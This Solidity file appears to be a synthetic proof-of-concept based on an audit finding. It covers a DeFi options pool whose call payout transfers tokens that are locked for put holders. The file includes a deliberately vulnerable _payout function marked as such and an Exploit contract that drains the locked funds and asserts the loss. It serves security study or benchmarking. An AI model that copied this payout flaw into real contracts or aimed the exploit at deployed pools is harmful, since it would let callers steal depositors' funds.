// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Hyperhyper — call payout spends buyToken that is locked for puts
    (Pashov, Hyperhyper 2025-03-30, H-04). SYNTHETIC, cheatcode-free.
    _payout is the blamed function (@> VULN).

    availablePayoutToken is rewardsByToken[buyToken].totalRewards, here 0.
    The shortfall is "swapped", but the swap mints nothing. The transfer
    still sends `pnl` from the pool's buyToken balance. That balance is the
    1000 locked for a put. The call holder receives 1000. The put locker
    withdraws 0. */

contract Asset {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] = balanceOf[to] + amount;
    }

    function approve(address spender, uint256 amount) external {
        allowance[msg.sender][spender] = amount;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address from, address to, uint256 amount) external {
        allowance[from][msg.sender] = allowance[from][msg.sender] - amount;
        balanceOf[from] = balanceOf[from] - amount;
        balanceOf[to] = balanceOf[to] + amount;
    }

    function transfer(address to, uint256 amount) external {
        balanceOf[msg.sender] = balanceOf[msg.sender] - amount;
        balanceOf[to] = balanceOf[to] + amount;
    }
}

contract Locker {
    function deposit(Pool pool, Asset token, uint256 amount) external {
        token.approve(address(pool), amount);
        pool.depositPut(amount);
    }

    function pull(Pool pool) external returns (uint256) {
        return pool.withdrawLocked();
    }
}

contract Pool {
    uint8 public constant CALL = 1;

    Asset public token;
    address public locker;
    uint256 public lockedBuy;
    uint256 public poolAmount;
    uint256 public totalRewards;
    uint256 public lastSwap;

    constructor(Asset _token) {
        token = _token;
    }

    function depositPut(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        locker = msg.sender;
        lockedBuy = lockedBuy + amount;
        poolAmount = poolAmount + amount;
    }

    function exerciseCall(uint256 pnl) external returns (uint256) {
        return _payout(CALL, pnl);
    }

    function _payout(uint8 opType, uint256 pnl) internal returns (uint256) {
        uint256 availablePayoutToken = totalRewards;
        if (opType == CALL && availablePayoutToken < pnl) {
            uint256 swapOut = pnl - availablePayoutToken;
            _swapAssetToAsset(swapOut);
        }
        poolAmount = poolAmount - pnl;
        // @> VULN: pnl is paid from pool buyToken, which includes funds locked for puts.
        token.transfer(msg.sender, pnl);
        return pnl;
    }

    function _swapAssetToAsset(uint256 amount) internal {
        lastSwap = amount;
    }

    function withdrawLocked() external returns (uint256 out) {
        if (msg.sender != locker) return 0;
        uint256 bal = token.balanceOf(address(this));
        if (bal < lockedBuy) {
            return 0;
        }
        out = lockedBuy;
        lockedBuy = 0;
        poolAmount = poolAmount - out;
        token.transfer(locker, out);
    }
}

contract Exploit {
    uint256 public constant N = 1000 ether;

    Asset public token; // nonce 1
    Locker public locker; // nonce 2
    Pool public pool; // nonce 3
    uint256 public lockedBefore;
    uint256 public paidToCall;
    uint256 public lockerGot;
    uint256 public poolLeft;

    constructor() {
        token = new Asset();
        locker = new Locker();
        pool = new Pool(token);
    }

    function run() external {
        token.mint(address(locker), N);
        locker.deposit(pool, token, N);
        lockedBefore = pool.lockedBuy();
        paidToCall = pool.exerciseCall(N);
        lockerGot = locker.pull(pool);
        poolLeft = token.balanceOf(address(pool));
        require(lockedBefore == N, "put did not lock 1000");
        require(pool.totalRewards() == 0, "rewards were not zero");
        require(pool.lastSwap() == N, "swap was not asked for the shortfall");
        require(paidToCall == N, "call did not pull the locked 1000");
        require(lockerGot == 0, "locker could still withdraw");
        require(poolLeft == 0, "pool still held the lock");
        require(token.balanceOf(address(this)) == N, "call holder did not receive 1000");
    }
}
